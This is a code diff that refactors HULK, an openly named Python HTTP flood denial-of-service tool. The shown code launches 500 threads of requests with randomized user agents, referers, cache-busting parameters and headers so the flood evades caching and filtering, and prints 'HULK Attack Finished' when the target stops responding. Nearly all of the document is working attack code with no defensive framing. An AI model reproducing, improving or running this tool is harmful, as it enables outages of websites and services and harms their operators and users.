@@ -8,9 +8,14 @@
 #
 # authors :  Barry Shteiman, Maxim Muzafarov , version 1.3
 # ----------------------------------------------------------------------------
-import sys, requests; from requests.exceptions import HTTPError, ConnectionError
-from random import randint, choice; from re import search
-from string import ascii_lowercase as alphabet; from threading import Thread
+import requests
+import sys
+from random import randint, choice
+from re import search
+from string import ascii_letters as alphabet
+from threading import Thread
+
+from requests.exceptions import HTTPError, ConnectionError
 
 # global params
 url = ''
@@ -128,52 +133,59 @@ useragents = [
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.66 Safari/537.36',
 ]
 
+
 # builds random referer from parts
-def getReferers():
-    randHTTP = ['https','http']
-    random.shuffle(randHTTP)
-    randWx3 = ['/www.','/']
-    random.shuffle(randWx3)
-    randDomains = ['alhea','aliexpress','amazon','apple','ask','baidu','bing','contenko','dogpile','dropbox','duckduckgo','ebay','engadget.search.aol','facebook','google','hao123', #host,
-                   'imdb','info','instagram','ixquick','linkedin','live','microsoft','msn','netflix','paltalk','paypal','pinterest','qq','reddit','s.weibo','search.aol','search.infospace',
-                   'search.yahoo','skype','sogou','sohu','tmall','tumblr','twitter','usatoday','us.wow','vk','webcrawler','wordpress','world.taobao','yandex','youtube']
-    random.shuffle(randDomains)
-    randRes = ['/search/results?q=', '/search?q=', '/search/', '/search/web?q=', '/search?q=', '/']
-    random.shuffle(randRes)
-    randReferers = '{0}:/{1}{2}.com{3}'.format(randHTTP[0], randWx3[1], randDomains[2], randRes[3])
-    return(randReferers)
-print getReferers()
+def get_referer():
+    protocol = ['https', 'http']
+    www = ['www.', '']
+    domains = ['alhea', 'aliexpress', 'amazon', 'apple', 'ask', 'baidu',
+               'bing', 'contenko', 'dogpile', 'dropbox', 'duckduckgo',
+               'ebay', 'engadget.search.aol', 'facebook', 'google',
+               'hao123',  # host,
+               'imdb', 'info', 'instagram', 'ixquick', 'linkedin', 'live',
+               'microsoft', 'msn', 'netflix', 'paltalk', 'paypal',
+               'pinterest', 'qq', 'reddit', 's.weibo', 'search.aol',
+               'search.infospace',
+               'search.yahoo', 'skype', 'sogou', 'sohu', 'tmall', 'tumblr',
+               'twitter', 'usatoday', 'us.wow', 'vk', 'webcrawler',
+               'wordpress', 'world.taobao', 'yandex', 'youtube']
+    location = ['/search/results?q=',
+                '/search?q=',
+                '/search/',
+                '/search/web?q=',
+                '/search?q=',
+                '/']
+    return choice(['%s://%s%s.com%s' % (choice(protocol), choice(www),
+                                        choice(domains), choice(location)),
+                   'http://%s/' % host])
+
 
 request_counter = 0
 flag = 0
 safe = False
 
+
 def inc_counter():
     global request_counter
     request_counter += 1
+
 
 def set_flag(val):
     global flag
     flag = val
 
+
 def set_safe():
     global safe
     safe = True
 
-# builds random ascii string
-def buildblocks(size):
-    out_str=''
-    _LOWERCASE = range(97,122)
-    _UPPERCASE = range(65,90)
-    _NUMERIC = range(48,57)
-    validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
-    for i in range(0, size):
-        a = choice(validChars)
-        out_str += chr(a)
-    return(out_str)
 
+# builds random ascii string
 def buildblock():
-    return ''.join(choice(alphabet) for _ in range(randint(3, 10)))
+    return choice(alphabet) + ''.join(
+        choice(alphabet + "0123456789") for _ in range(randint(3, 10))
+    )
+
 
 def usage():
     print('---------------------------------------------------')
@@ -181,6 +193,7 @@ def usage():
     print('you can add "safe" after url, to autoshut after dos')
     print('---------------------------------------------------')
     sys.exit()
+
 
 # http request
 def httpcall(url):
@@ -191,9 +204,9 @@ def httpcall(url):
             params={buildblock(): buildblock()},
             headers={
                 'User-Agent': choice(useragents),
-                'Cache-Control': random.choice(['no-cache','max-age=0']),
+                'Cache-Control': choice(['no-cache', 'max-age=0']),
                 'Accept-Charset': 'ISO-8859-1,UTF-8;q=0.7,*;q=0.7',
-                'Referer': getReferers() + buildblocks(random.randint(5,10)),
+                'Referer': get_referer() + buildblock(),
                 'Keep-Alive': randint(110, 120)}
         )
     except HTTPError as e:
@@ -211,12 +224,13 @@ def httpcall(url):
             params={buildblock(): buildblock()},
             headers={
                 'User-Agent': choice(useragents),
-                'Cache-Control': random.choice(['no-cache','max-age=0']),
+                'Cache-Control': choice(['no-cache', 'max-age=0']),
                 'Accept-Charset': 'ISO-8859-1,UTF-8;q=0.7,*;q=0.7',
-                'Referer': getReferers() + buildblocks(random.randint(5,10)),
+                'Referer': get_referer() + buildblock(),
                 'Keep-Alive': randint(110, 120)}
         )
     return (code)
+
 
 # http caller thread
 class HTTPThread(Thread):
@@ -229,6 +243,7 @@ class HTTPThread(Thread):
         except Exception as ex:
             pass
 
+
 # monitors http threads and counts requests
 class MonitorThread(Thread):
     def run(self):
@@ -239,6 +254,7 @@ class MonitorThread(Thread):
                 prev = request_counter
         if flag > 1:
             print("\n-- HULK Attack Finished --")
+
 
 if __name__ == "__main__":
     # execute
@@ -258,7 +274,6 @@ if __name__ == "__main__":
                     url += "/"
                 m = search('https?\://([^/]*)/?.*', url)
                 host = m.group(1)
-                referers.append('http://' + host + '/')
                 for i in range(500):
                     t = HTTPThread()
                     t.start()
